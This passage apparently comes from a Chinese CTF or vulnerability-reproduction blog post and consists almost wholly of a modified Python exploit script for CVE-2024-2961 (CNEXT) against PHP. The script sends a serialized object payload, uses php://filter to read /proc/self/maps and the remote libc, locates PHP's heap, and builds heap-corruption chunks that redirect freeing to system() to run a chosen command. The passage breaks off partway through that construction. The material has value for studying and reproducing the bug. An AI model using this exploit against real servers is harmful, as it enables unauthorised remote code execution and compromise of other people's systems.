href="https://c1oudfl0w0.github.io/blog/2024/05/31/CVE-2024-2961%E5%A4%8D%E7%8E%B0/">CVE-2024-2961复现</a>中亦有记载</p><p>自己改exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ChunkedEncodingError<span class="token punctuation">,</span> ConnectionError<span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Response<span class="token punctuation">:</span>        path_length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        params1<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"?start=O:9:%22read_file%22:2:%7Bs:5:%22start%22;s:9:%22gxngxngxn%22;s:8:%22filename%22;s:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path_length<span class="token punctuation">&#125;</span></span><span class="token string">:%22</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">%22;%7D'"</span></span>        params2<span class="token operator">=</span><span class="token string">"&amp;read=%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9fAA%f0%9f"</span>        url<span class="token operator">=</span>self<span class="token punctuation">.</span>url<span class="token operator">+</span>params1<span class="token operator">+</span>params2        response <span class="token operator">=</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># for key, value in params.items():</span>        <span class="token comment">#     print(f"&#123;key&#125;: &#123;value&#125;")</span>        <span class="token comment">#print(response.text)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response            <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        data <span class="token operator">=</span> response<span class="token punctuation">.</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"What you are reading is:(.*)"</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment"># print(data)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep_time"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>                    <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>                result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>text<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base64<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]&#123;3&#125;[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">"/dev/shm/cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        Path<span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Region<span class="token punctuation">:</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">>=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">""</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>heaps<span class="token punctuation">&#125;</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>        LIBC <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span>        ADDR_EMALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_malloc"</span><span class="token punctuation">]</span>        ADDR_EFREE <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_system"</span><span class="token punctuation">]</span>        ADDR_EREALLOC <span class="token operator">=</span> LIBC<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__libc_realloc"</span><span class="token punctuation">]</span>        ADDR_HEAP <span class="token operator">=</span> self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span>        ADDR_FREE_SLOT <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x20</span>        ADDR_CUSTOM_HEAP <span class="token operator">=</span> ADDR_HEAP <span class="token operator">+</span> <span class="token number">0x0168</span>        ADDR_FAKE_BIN <span class="token operator">=</span> ADDR_FREE_SLOT <span class="token operator">-</span> <span class="token number">0x10</span>        CS <span class="token operator">=</span> <span class="token number">0x100</span>        <span class="token comment"># Pad needs to stay at size 0x100 at every step</span>        pad_size <span class="token operator">=</span> CS <span class="token operator">-</span> <span class="token number">0x18</span>        pad <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> pad_size        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>pad<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pad<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span>        pad <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>        step1_size <span class="token operator">=</span> <span class="token number">1</span>        step1 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step1_size        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step1<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step1 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step1<span class="token punctuation">)</span>        step2_size <span class="token operator">=</span> <span class="token number">0x48</span>        step2 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token punctuation">(</span>step2_size <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> <span class="token string">b"0\n"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>step2_size<span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ADDR_FAKE_BIN<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">,</span> CS<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step2_write_ptr <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step2_write_ptr<span class="token punctuation">)</span>        step3_size <span class="token operator">=</span> CS        step3 <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> step3_size        <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>step3<span class="token punctuation">)</span> <span class="token operator">==</span> CS        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> chunked_chunk<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3 <span class="token operator">=</span> compressed_bucket<span class="token punctuation">(</span>step3<span class="token punctuation">)</span>        step3_overflow <span class="token operator">=</span> <span class="token string">b"\x00"</span> <span class="token operator">*</span> <span class="token 